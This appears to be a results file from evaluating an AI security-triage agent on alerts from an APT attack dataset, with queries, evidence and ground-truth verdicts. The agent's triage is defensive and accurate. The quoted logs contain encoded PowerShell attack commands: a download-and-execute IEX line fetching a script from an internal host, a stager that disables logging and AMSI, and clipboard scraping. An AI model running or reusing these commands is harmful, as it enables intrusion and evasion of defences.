  {
    "model": "gemma4:12b-it-q8_0",
    "dataset": "apt3",
    "rule": "powershell_encoded_command",
    "title": "PowerShell Encoded Command Execution",
    "timestamp": "2019-05-14T22:41:48.711Z",
    "computer": "HR001.shire.com",
    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noninteractive -Sta -encodedCommand CgAgACAAIAAgACAAIAAgACAAIAAgACAAIABBAGQAZAAtAFQAeQBwAGUAIAAtAEEAcwBzAGUAbQBiAGwAeQAgAFAAcgBlAHMAZQBuAHQAYQB0AGkAbwBuAEMAbwByAGUACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABbAFcAaQBuAGQAbwB3AHMALgBDAGwAaQBwAGIAbwBhAHIAZABdADoAOgBHAGUAdABUAGUAeAB0ACgAKQAgAC0AcgBlAHAAbABhAGMAZQAgACIAYAByACIALAAgACcAJwAgAC0AcwBwAGwAaQB0ACAAIgBgAG4AIgAgACAACgAgACAAIAAgACAAIAAgACAA -inputFormat xml -outputFormat xml",
    "event_id": "1",
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "triage": {
      "summary": "User SHIRE\\martha executed an encoded PowerShell command on HR001.shire.com that programmatically accessed and scraped the system clipboard. This was confirmed by Script Block logs (Event ID 4104) showing the use of 'Add-Type -Assembly PresentationCore' followed by '[Windows.Clipboard]::GetText()'. The activity occurred at approximately 2019-05-14T22:41:49Z.",
      "technique": "T1056.003",
      "technique_name": "Input Capture: Clipboard",
      "confidence": 0.9,
      "disposition": "malicious_true_positive",
      "reasoning": "Sysmon Event ID 1 shows a PowerShell process executed with an encoded command. Subsequent Script Block logs (Event ID 4104) revealed the decoded intent to capture clipboard data using .NET classes, which is a common technique for stealing credentials or sensitive information.",
      "scope": {
        "systems": [
          "HR001.shire.com"
        ],
        "users": [
          "SHIRE\\martha"
        ],
        "data": "System Clipboard content",
        "timeframe": "2019-05-14T22:41:48Z to 2019-05-14T22:41:52Z"
      },
      "escalate": true,
      "escalation_rationale": "The activity involves programmatic clipboard scraping, which is a high-fidelity indicator of credential or data theft. The use of encoded commands and multi-stage PowerShell execution further supports malicious intent.",
      "recommended_actions": [
        "Isolate host HR001.shire.com from the network to prevent potential exfiltration.",
        "Reset credentials for user SHIRE\\martha.",
        "Perform a full forensic sweep of HR001.shire.com for persistence mechanisms (e.g., scheduled tasks, registry run keys).",
        "Check for any subsequent network connections or file writes by the user account 'martha' outside of the immediate 3-minute window."
      ],
      "queries_run": [
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE Channel LIKE '%Microsoft-Windows-PowerShell/Operational%' AND Computer = 'HR001.shire.com' LIMIT 20;",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine, ScriptBlockText\nFROM logs\nWHERE EventID = 4104\n  AND Channel LIKE '%Microsoft-Windows-PowerShell/Operational%'\n  AND Computer LIKE '%HR001.shire.com%'\n  AND TimeCreated BETWEEN '2019-05-14T22:40:00Z' AND '2019-05-14T22:43:00Z'\nLIMIT 20;",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE Computer LIKE '%HR001.shire.com%' AND TimeCreated = '2019-05-14T22:41:48Z' AND Image LIKE '%powershell%' LIMIT 20;",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE EventID = 1 AND Computer LIKE '%HR001.shire.com%' AND TimeCreated BETWEEN '2019-05-14T22:40:00Z' AND '2019-05-14T22:43:00Z' AND CommandLine LIKE '%powershell%' LIMIT 20",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE EventID = 3 AND User LIKE '%SHIRE\\martha%' AND Computer LIKE '%HR001.shire.com%' AND TimeCreated BETWEEN '2019-05-14T22:40:00Z' AND '2019-05-14T22:43:00Z' LIMIT 20"
      ]
    },
    "fallback_used": false,
    "fallback_reason": null,
    "ground_truth_verdict": "bad",
    "evidence_trail": [
      {
        "question": "What are the PowerShell script block logs (Microsoft-Windows-PowerShell/Operational) for this process or associated with this timestamp on HR001.shire.com?",
        "evidence": "20 record(s):\n[{\"TimeCreated\": \"2019-05-14T22:32:28.095Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:31.818Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:32.546Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:32.735Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:32.735Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:34.551Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:36.018Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:36.043Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:36.078Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:36.093Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:36.359Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:36.392Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:36.423Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:36.669Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:38.224Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:38.698Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:38.735Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:38.945Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:38.976Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:38.996Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}]\n(Showing the first 20 records; there may be more \u2014 ask a more specific question to narrow it down.)"
      },
      {
        "question": "What are the contents of the script blocks (Event ID 4104) in Microsoft-Windows-PowerShell/Operational for HR001.shire.com between 2019-05-14T22:40:00Z and 2019-05-14T22:43:00Z?",
        "evidence": "2 record(s):\n[{\"TimeCreated\": \"2019-05-14T22:41:49.532Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"ScriptBlockText\": \"\\n            Add-Type -Assembly PresentationCore\\n            [Windows.Clipboard]::GetText() -replace \\\"`r\\\", '' -split \\\"`n\\\"  \\n        \"}, {\"TimeCreated\": \"2019-05-14T22:41:52.345Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"ScriptBlockText\": \"$global:?\"}]"
      },
      {
        "question": "What was the parent process and the user account associated with the PowerShell execution on HR001.shire.com at 2019-05-14T22:41:48Z?",
        "evidence": "No matching records found for: What was the parent process and the user account associated with the PowerShell execution on HR001.shire.com at 2019-05-14T22:41:48Z?"
      },
      {
        "question": "What are the Sysmon Process Creation (Event ID 1) records on HR001.shire.com around 2019-05-14T22:41:48Z to identify the parent process and user account for this PowerShell execution?",
        "evidence": "1 record(s):\n[{\"TimeCreated\": \"2019-05-14T22:41:48.711Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -noninteractive -Sta -encodedCommand CgAgACAAIAAgACAAIAAgACAAIAAgACAAIABBAGQAZAAtAFQAeQBwAGUAIAAtAEEAcwBzAGUAbQBiAGwAeQAgAFAAcgBlAHMAZQBuAHQAYQB0AGkAbwBuAEMAbwByAGUACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABbAFcAaQBuAGQAbwB3AHMALgBDAGwAaQBwAGIAbwBhAHIAZABdADoAOgBHAGUAdABUAGUAeAB0ACgAKQAgAC0AcgBlAHAAbABhAGMAZQAgACIAYAByACIALAAgACcAJwAgAC0AcwBwAGwAaQB0ACAAIgBgAG4AIgAgACAACgAgACAAIAAgACAAIAAgACAA -inputFormat xml -outputFormat xml\", \"ParentImage\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"ParentCommandLine\": \"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQ \u2026[truncated \u2014 ask for fewer columns or rows]"
      },
      {
        "question": "What are the network connection events (Sysmon Event ID 3) for user SHIRE\\martha on HR001.shire.com between 2019-05-14T22:40:00Z and 2019-05-14T22:43:00Z?",
        "evidence": "No matching records found for: What are the network connection events (Sysmon Event ID 3) for user SHIRE\\martha on HR001.shire.com between 2019-05-14T22:40:00Z and 2019-05-14T22:43:00Z?"
      }
    ],
    "grounding_rounds": 0,
    "grounding_unsupported": [],
    "zero_evidence_rounds": 0
  },
  {
    "model": "gemma4:12b-it-q8_0",
    "dataset": "apt3",
    "rule": "powershell_encoded_command",
    "title": "PowerShell Encoded Command Execution",
    "timestamp": "2019-05-14T22:51:19.220Z",
    "computer": "HR001.shire.com",
    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "command_line": "powershell.exe -w 1 -enc SQBFAFgAIAAiACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAwAC4AMQAwAC4AMQAwADYAOgA4ADAAOAAwAC8AdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAIgB8AEkARQBYAA==",
    "event_id": "1",
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "triage": {
      "summary": "A PowerShell process was executed on host HR001.shire.com by user SHIRE\\martha. The command line contained a Base64 encoded string that decodes to 'IEX (new-object net.webclient).downloadstring(\\'http://10.0.10.106:8080/update.ps1\\')|IEX'. This is a classic fileless execution technique used to download and execute a script directly into memory.",
      "technique": "T1059.001",
      "technique_name": "PowerShell",
      "confidence": 1.0,
      "disposition": "malicious_true_positive",
      "reasoning": "The decoded command line explicitly uses 'Net.WebClient' to fetch a remote script ('update.ps1') from an internal IP (10.0.10.106) and pipes it into 'IEX' (Invoke-Expression), which executes the content immediately in memory without saving it to disk.",
      "scope": {
        "systems": [
          "HR001.shire.com"
        ],
        "users": [
          "SHIRE\\martha"
        ],
        "data": "http://10.0.10.106:8080/update.ps1",
        "timeframe": "2019-05-14T22:51:19Z"
      },
      "escalate": true,
      "escalation_rationale": "The activity shows clear evidence of a 'download and execute' malware delivery technique. The use of IEX with a remote URL is highly indicative of an active compromise or unauthorized script execution.",
      "recommended_actions": [
        "Isolate HR001.shire.com from the network to prevent further lateral movement or C2 communication.",
        "Investigate the source IP 10.0.10.106 to determine if it is a compromised internal host acting as a staging point.",
        "Perform a full forensic sweep of HR001.shire.com for persistence mechanisms (e.g., scheduled tasks, registry run keys).",
        "Reset credentials for the user SHIRE\\martha."
      ],
      "queries_run": [
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE Computer LIKE '%HR001.shire.com%' AND Image LIKE '%powershell%' AND TimeCreated BETWEEN '2019-05-14T22:51:18Z' AND '2019-05-14T22:51:20Z' LIMIT 20",
        "SELECT TimeCreated, Computer, Channel, EventID, Image, CommandLine, ParentImage, ParentCommandLine, User, IpAddress FROM logs WHERE Computer = 'HR001.shire.com' AND IpAddress LIKE '%10.0.10.106%' AND TimeCreated BETWEEN '2019-05-14T22:50:00Z' AND '2019-05-14T22:53:00Z' LIMIT 20;"
      ]
    },
    "fallback_used": false,
    "fallback_reason": null,
    "ground_truth_verdict": "bad",
    "evidence_trail": [
      {
        "question": "What is the parent process, the user account, and the full command line of the PowerShell execution on HR001.shire.com at 2019-05-14T22:51:19?",
        "evidence": "20 record(s):\n[{\"TimeCreated\": \"2019-05-14T22:51:19.006Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:51:19.220Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"powershell.exe -w 1 -enc SQBFAFgAIAAiACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAwAC4AMQAwAC4AMQAwADYAOgA4ADAAOAAwAC8AdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAIgB8AEkARQBYAA==\", \"ParentImage\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"ParentCommandLine\": \"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9AC \u2026[truncated \u2014 ask for fewer columns or rows]\n(Showing the first 20 records; there may be more \u2014 ask a more specific question to narrow it down.)"
      },
      {
        "question": "Are there any successful network connections from HR001.shire.com to the IP address 10.0.10.106 on port 8080 around 2019-05-14T22:51:19?",
        "evidence": "No matching records found for: Are there any successful network connections from HR001.shire.com to the IP address 10.0.10.106 on port 8080 around 2019-05-14T22:51:19?"
      }
    ],
    "grounding_rounds": 0,
    "grounding_unsupported": [],
    "zero_evidence_rounds": 0
  },
  {
    "model": "gemma4:12b-it-q8_0",
    "dataset": "apt3",
    "rule": "powershell_encoded_command",
    "title": "PowerShell Encoded Command Execution",
    "timestamp": "2019-05-14T22:51:21.497Z",
    "computer": "HR001.shire.com",
    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
